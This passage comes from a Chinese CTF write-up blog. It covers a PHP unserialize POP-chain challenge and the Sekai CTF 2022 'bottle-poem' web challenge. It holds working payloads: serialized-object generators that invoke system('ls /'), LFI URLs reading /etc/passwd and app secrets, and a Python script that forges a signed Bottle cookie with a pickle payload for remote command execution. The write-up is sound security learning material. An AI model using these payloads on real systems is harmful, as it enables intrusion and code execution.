class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span> = <span class="string">&quot;hint is depend on you&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hint = <span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">        <span class="variable">$name</span>();</span><br><span class="line"><span class="comment">//sorry类的__get函数有$name()，联想到__invoke，fine类的__invoke 函数有call_user_func函数，也就是突破口</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password == <span class="variable language_">$this</span>-&gt;name) &#123;</span><br><span class="line">    <span class="comment">//这里的password和name就需要外部实例化后赋值为相同的，因为这样才能通过下面语句调用魔术方法，而不执行else语句</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;hint;</span><br><span class="line">        <span class="comment">//sorry的析构函数有echo $this-&gt;hint 联想一下__toString函数，在Show类中</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name = <span class="string">&quot;jay&quot;</span>) &#123;</span><br><span class="line">            secret_code::<span class="title function_ invoke__">secret</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;This is our code&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPassword</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setPassword</span>(<span class="params"><span class="variable">$password</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">secret</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include_once</span> <span class="string">&quot;hint.php&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">hint</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$num</span> = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$num</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;code-&gt;secret;  </span><br><span class="line"><span class="comment">//secret_code类的show函数有this-&gt;code-&gt;secret，secret属性是所有类都没有的，自然联想到__get，在Sorry类里</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">setPassword</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span class="string">&quot;Ctfer&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>pop链的构造</p>
<p>切入口 sorry类的析构函数，<strong>突破口fine类的__invoke函数中的call_user_func函数</strong></p>
<p><code>sorry.__destruct -&gt; show.__toString</code><br><code>-&gt;</code><br><code>secret.show()</code><br><code>-&gt;</code><br><code>sorry.__get() -&gt; fine.__invoke()</code><br><code>-&gt;</code><br><code>call_user_func函数</code></p>
<p>#call_user_func(a,b) — 把第一个参数作为回调函数调用, 其余参数是回调函数的参数<br>#也就是把a当作函数，把b当作传入a函数的参数【如call_user_func(assert,phpinfo()),就会执行代码phpinfo()】</p>
</blockquote>
<p>所以<code>payload</code>为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$time</span> = <span class="string">&quot;Two and a half years&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span> = <span class="string">&quot;hint is depend on you&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Fine</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fine</span>();</span><br><span class="line"><span class="variable">$Show</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="variable">$Sorry</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>();</span><br><span class="line"><span class="variable">$Sorry2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>();</span><br><span class="line"><span class="comment">//这里实例化两次sorry是因为当，脚本运行完毕后，会执行__destruct()魔术方法，从而清空了变量引用，也就相当于关闭了这个类，</span></span><br><span class="line"><span class="comment">//但是后续还需要调用其中的魔术方法，所以需要再次实例化，并重新为password和name相同赋值</span></span><br><span class="line"><span class="variable">$Secret</span> = <span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$Sorry</span>-&gt;name = <span class="string">&#x27;cc&#x27;</span>;</span><br><span class="line"><span class="variable">$Sorry</span>-&gt;password = <span class="string">&#x27;cc&#x27;</span>;</span><br><span class="line"><span class="variable">$Sorry</span>-&gt;hint = <span class="variable">$Show</span>;</span><br><span class="line"><span class="variable">$Show</span>-&gt;ctf = <span class="variable">$Secret</span>;</span><br><span class="line"><span class="variable">$Secret</span>-&gt;code = <span class="variable">$Sorry2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Sorry2</span>-&gt;name = <span class="string">&#x27;cc&#x27;</span>;</span><br><span class="line"><span class="variable">$Sorry2</span>-&gt;password = <span class="string">&#x27;cc&#x27;</span>;</span><br><span class="line"><span class="variable">$Sorry2</span>-&gt;key = <span class="variable">$Fine</span>;</span><br><span class="line"><span class="variable">$Fine</span>-&gt;cmd = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$Fine</span>-&gt;content = <span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$Sorry</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong>补充</strong>：另一种写法，一定要<code>url</code>编码，因为里边有不可见字符。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span>, <span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$time</span> = <span class="string">&quot;Two and a half years&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$ctf</span>, <span class="variable">$time</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ctf = <span class="variable">$ctf</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;time = <span class="variable">$time</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span> = <span class="string">&quot;hint is depend on you&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$password</span>,<span class="variable">$hint</span>,<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hint  = <span class="variable">$hint</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Sorry</span>= <span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>(<span class="string">&#x27;cc&#x27;</span>,<span class="string">&#x27;cc&#x27;</span>,<span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>(<span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>(<span class="string">&#x27;cc&#x27;</span>,<span class="string">&#x27;cc&#x27;</span>,<span class="string">&#x27;cc&#x27;</span>,<span class="keyword">new</span> <span class="title function_ invoke__">fine</span>(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>))),<span class="string">&#x27;cc&#x27;</span>),<span class="string">&#x27;cc&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//因为这里没有修改变量修饰，</span></span><br><span class="line"><span class="comment">//对于private修饰变量无法直接传参，需要实例化类xx(a,b)，然后才能成功传参，当然public类也可以用这种方法传参，只是没必要，但这里是用了的</span></span><br><span class="line"><span class="comment">//比如sorry类中name和password变量赋值为cc后，后面实例化的show类就是赋值给public hint变量，是按变量声明顺序来进行赋值的</span></span><br><span class="line"><span class="comment">//这里的嵌套就是同上面的payload一样，只是把变量赋值为实例化的类，实例化类的里面再嵌入变量值和其他实例化的类</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$Sorry</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>Game</tag>
      </tags>
  </entry>
  <entry>
    <title>Sekai CTF 2022</title>
    <url>/2022SekaiCTF/</url>
    <content><![CDATA[<p><code>国外比赛难度确实逆天</code></p>
<span id="more"></span>

<h1 id="Sekai-CTF-2022"><a href="#Sekai-CTF-2022" class="headerlink" title="Sekai CTF 2022"></a>Sekai CTF 2022</h1><p><a href="https://github.com/project-sekai-ctf/sekaictf-2022">https://github.com/project-sekai-ctf/sekaictf-2022</a></p>
<p>这是官方的<code>wp</code>和题目的<code>docker</code>，我后面还是把<code>web</code>都复现一下</p>
<p><a data-fancybox="gallery" data-src="/2022SekaiCTF/image-20221003101420158.png"><img src="/2022SekaiCTF/image-20221003101420158.png" alt="image-20221003101420158"></a></p>
<p><code>大比赛，每个题要么难出头，要么感觉就差一点，与大佬的差距，鼠鼠只能赛后复现wp了</code></p>
<p><a data-fancybox="gallery" data-src="/2022SekaiCTF/image-20221003104433566.png"><img src="/2022SekaiCTF/image-20221003104433566.png" alt="image-20221003104433566"></a></p>
<p><code>这是web难度【看起来就是按解题人数来分】</code></p>
<h2 id="1-bottle-poem-后续学习了，补上自己的思路"><a href="#1-bottle-poem-后续学习了，补上自己的思路" class="headerlink" title="1.bottle-poem[后续学习了，补上自己的思路]"></a>1.bottle-poem[后续学习了，补上自己的思路]</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">hint：</span><br><span class="line"></span><br><span class="line">Come <span class="keyword">and</span> read poems <span class="keyword">in</span> the bottle.</span><br><span class="line"></span><br><span class="line">No bruteforcing <span class="keyword">is</span> required to solve this challenge. Please do <span class="keyword">not</span> use scanner tools. Rate limiting <span class="keyword">is</span> applied. Flag <span class="keyword">is</span> executable on server.</span><br><span class="line"></span><br><span class="line">翻译：</span><br><span class="line"></span><br><span class="line">快来读一读瓶中的诗吧。</span><br><span class="line"></span><br><span class="line">解决这一挑战不需要暴力破解。请不要使用扫描仪工具。应用速率限制。标志在服务器上是可执行的。</span><br></pre></td></tr></table></figure>

<p>这道题我已经秃头了，开始觉得是单纯的文件包含，但是后面看到官方发的wp，感觉又没那么简单</p>
<p>我先直接展示官方的wp，然后再展示我复现的过程</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">Hey guys Thx <span class="keyword">for</span> attending SekaiCTF  i made two challenges <span class="keyword">for</span> this competition one <span class="keyword">is</span> bottle poem another <span class="keyword">is</span> sekaigame start</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> the bottle poem most of people think its guessy <span class="keyword">and</span> at the start the challenge always down  so say sorry to u <span class="keyword">and</span> respect to my buddy hfz that he fix this challenge </span><br><span class="line"></span><br><span class="line">here <span class="keyword">is</span> my short wp</span><br><span class="line">-----------------</span><br><span class="line">it<span class="string">&#x27;s easy to find that this website has LFI</span></span><br><span class="line"><span class="string">u wanna to  read file directly but failed </span></span><br><span class="line"><span class="string">that&#x27;</span>s <span class="keyword">not</span> show u that we hide it  that means u havent enough execute permission to read it (so we update description that flag <span class="keyword">is</span> executable <span class="keyword">and</span> u dont need some bruteforcing <span class="keyword">or</span> guessing)flag <span class="keyword">is</span> <span class="keyword">in</span> the common path /flag</span><br><span class="line"></span><br><span class="line">so we need to read source</span><br><span class="line">just like this</span><br><span class="line"></span><br><span class="line">http://bottle-poem.ctf.sekai.team/show?<span class="built_in">id</span>=/proc/self/cwd/app.py</span><br><span class="line"></span><br><span class="line">so dont need to bruteforce proc/self/ just use it to got sourcecode</span><br><span class="line"></span><br><span class="line">use this way u can read the secret --sekai</span><br><span class="line"></span><br><span class="line">http://bottle-poem.ctf.sekai.team/show?<span class="built_in">id</span>=/proc/self/cwd/config/secret.py</span><br><span class="line"></span><br><span class="line">now u can control the cookies but <span class="keyword">if</span> u read something just like /views/admin.html <span class="keyword">or</span> just make guest to admin u would find its a troll </span><br><span class="line"></span><br><span class="line">so u need rce truely <span class="keyword">if</span> u search some documentation will find the bottle<span class="string">&#x27;s cookie_decode() will unpickle so use this to get rce</span></span><br><span class="line"><span class="string">https://github.com/bottlepy/bottle/issues/900</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">here the steps</span></span><br><span class="line"><span class="string">1.lfi to read file and    secret</span></span><br><span class="line"><span class="string">2.use cookie pickle rce to reverse a shell</span></span><br><span class="line"><span class="string">3.execute /flag to get flag</span></span><br><span class="line"><span class="string">---------</span></span><br><span class="line"><span class="string">and my exp </span></span><br><span class="line"><span class="string">-------------</span></span><br><span class="line"><span class="string">demo exp</span></span><br><span class="line"><span class="string">import base64,hashlib,pickle,hmac</span></span><br><span class="line"><span class="string">import os</span></span><br><span class="line"><span class="string">def tob(s, enc=&#x27;</span>utf8<span class="string">&#x27;):</span></span><br><span class="line"><span class="string">    if isinstance(s, str):</span></span><br><span class="line"><span class="string">        return s.encode(enc)</span></span><br><span class="line"><span class="string">    return b&#x27;</span><span class="string">&#x27; if s is None else bytes(s)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def cookie_encode(data, key):</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="string">&#x27;&#x27;</span> Encode <span class="keyword">and</span> sign a pickle-able <span class="built_in">object</span>. Return a (byte) string <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    msg = base64.b64encode(pickle.dumps(data, 0))</span></span><br><span class="line"><span class="string">    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())</span></span><br><span class="line"><span class="string">    return tob(&#x27;!&#x27;) + sig + tob(&#x27;?&#x27;) + msg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">class test():</span></span><br><span class="line"><span class="string">    def __reduce__(self):</span></span><br><span class="line"><span class="string">        return (eval,(&#x27;__import__(&quot;os&quot;).popen(&quot;command&quot;)&#x27;,))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">obj = test()</span></span><br><span class="line"><span class="string">a = cookie_encode(obj,&#x27;Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu&#x27;)</span></span><br><span class="line"><span class="string">print(a)</span></span><br></pre></td></tr></table></figure>

<p>翻译</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">大家好，感谢参加 SekaiCTF 我为这次比赛提出了两个挑战，一个是瓶子诗，另一个是 sekaigame start</span><br><span class="line"></span><br><span class="line">对于瓶子诗，大多数人认为它是猜测性的，一开始挑战总是失败，所以向你说声抱歉，并尊重我的好友 hfz，他解决了这个挑战</span><br><span class="line"></span><br><span class="line">这是我的简短 wp</span><br><span class="line">-----------------</span><br><span class="line">很容易发现这个网站有LFI（本地文件包含）</span><br><span class="line">你想直接读取文件但失败了</span><br><span class="line">这并没有告诉你我们隐藏它，这意味着你没有足够的执行权限来读取它（所以我们更新了标志是可执行的并且你不需要一些暴力破解或猜测的描述）标志在公共路径/标志中</span><br><span class="line"></span><br><span class="line">所以我们需要阅读源码</span><br><span class="line">像这样</span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//</span>bottle-poem.ctf.sekai.team<span class="regexp">/show?id=/</span>proc<span class="regexp">/self/</span>cwd/app.py</span><br><span class="line"></span><br><span class="line">所以不需要蛮力 proc<span class="regexp">/self/</span> 只需使用它来获取源代码</span><br><span class="line"></span><br><span class="line">使用这种方式你可以阅读秘密--sekai</span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//</span>bottle-poem.ctf.sekai.team<span class="regexp">/show?id=/</span>proc<span class="regexp">/self/</span>cwd<span class="regexp">/config/</span>secret.py</span><br><span class="line"></span><br><span class="line">现在您可以控制 cookie，但如果您阅读 <span class="regexp">/views/</span>admin.html 之类的内容，或者只是让访客成为管理员，您会发现它是一个巨魔（可以理解为恶搞）</span><br><span class="line"></span><br><span class="line">所以你真的需要 rce 如果你搜索一些文档会发现瓶子的 cookie_decode() 会解开所以用它来获取 rce</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/bottlepy/</span>bottle<span class="regexp">/issues/</span><span class="number">900</span></span><br><span class="line"></span><br><span class="line">这里的步骤</span><br><span class="line"><span class="number">1</span>.lfi读取文件和秘密</span><br><span class="line"><span class="number">2</span>.使用cookie pickle rce 反弹一个shell</span><br><span class="line"><span class="number">3</span>.执行/flag获取flag</span><br></pre></td></tr></table></figure>

<p>官方<code>exp</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">demo exp</span><br><span class="line"><span class="keyword">import</span> base64,hashlib,pickle,hmac</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tob</span>(<span class="params">s, enc=<span class="string">&#x27;utf8&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> s.encode(enc)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span> <span class="keyword">if</span> s <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="built_in">bytes</span>(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_encode</span>(<span class="params">data, key</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27; Encode and sign a pickle-able object. Return a (byte) string &#x27;&#x27;&#x27;</span></span><br><span class="line">    msg = base64.b64encode(pickle.dumps(data, <span class="number">0</span>))</span><br><span class="line">    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())</span><br><span class="line">    <span class="keyword">return</span> tob(<span class="string">&#x27;!&#x27;</span>) + sig + tob(<span class="string">&#x27;?&#x27;</span>) + msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;command&quot;)&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj = test()</span><br><span class="line">a = cookie_encode(obj,<span class="string">&#x27;Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>

<hr>
<p>下面是我复现理解操作</p>
<p>先打开网站，看到有三个可以打开的链接</p>
<p><a data-fancybox="gallery" data-src="/2022SekaiCTF/image-20221003201506807.png"><img src="/2022SekaiCTF/image-20221003201506807.png" alt="image-20221003201506807"></a></p>
<p>先看看源码</p>
<p><a data-fancybox="gallery" data-src="/2022SekaiCTF/image-20221003201547093.png"><img src="/2022SekaiCTF/image-20221003201547093.png" alt="image-20221003201547093"></a></p>
<p>发现没什么额外的信息，三个链接是对应着三个文本文件</p>
<p>看起来似乎是文件包含的题</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://bottle-poem.ctf.sekai.team/show?<span class="built_in">id</span>=spring.txt</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/2022SekaiCTF/image-20221003202543907.png"><img src="/2022SekaiCTF/image-20221003202543907.png" alt="image-20221003202543907"></a></p>
<p>我们试试能不能显示其他信息，我在做的时候试的是<code>/etc/passwd</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://bottle-poem.ctf.sekai.team/show?<span class="built_in">id</span>=/etc/passwd</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/2022SekaiCTF/image-20221003202814644.png"><img src="/2022SekaiCTF/image-20221003202814644.png" alt="image-20221003202814644"></a></p>
<p>看来是方向对了，确实是可以包含本地文件并显示，但是没有其他信息能利用</p>
<h3 id="查看当前进程的启动命令"><a href="#查看当前进程的启动命令" class="headerlink" title="*查看当前进程的启动命令"></a>*查看当前进程的启动命令</h3><p>这个是看最后发的<code>wp</code>，学到了</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/proc/</span><span class="keyword">self</span><span class="operator">/</span>cmdline</span><br><span class="line"></span><br><span class="line"><span class="comment">//该文件包含的是该进程的命令行参数，包括进程的启动路径(argv[0])</span></span><br></pre></td></tr></table></figure>

<p>然后会下载一个名叫<code>show</code>的文件</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">python3 -<span class="keyword">u</span> /<span class="keyword">app</span>/<span class="keyword">app</span>.py </span><br></pre></td></tr></table></figure>

<p>在命令中，我们发现运行了一个<code>/app/app.py</code>的文件</p>
<p>看来这就是我们网站启动的脚本，里面就有我们网站的源码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://bottle-poem.ctf.sekai.team/show?<span class="built_in">id</span>=/app/app.py</span><br></pre></td></tr></table></figure>

<p>查看到文件源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> route, run, template, request, response, error</span><br><span class="line"><span class="keyword">from</span> config.secret <span class="keyword">import</span> sekai</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> template(<span class="string">&quot;index&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/show&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    response.content_type = <span class="string">&quot;text/plain; charset=UTF-8&quot;</span></span><br><span class="line">    param = request.query.<span class="built_in">id</span></span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">&quot;^../app&quot;</span>, param):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No!!!!&quot;</span></span><br><span class="line">    requested_path = os.path.join(os.getcwd() + <span class="string">&quot;/poems&quot;</span>, param)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span 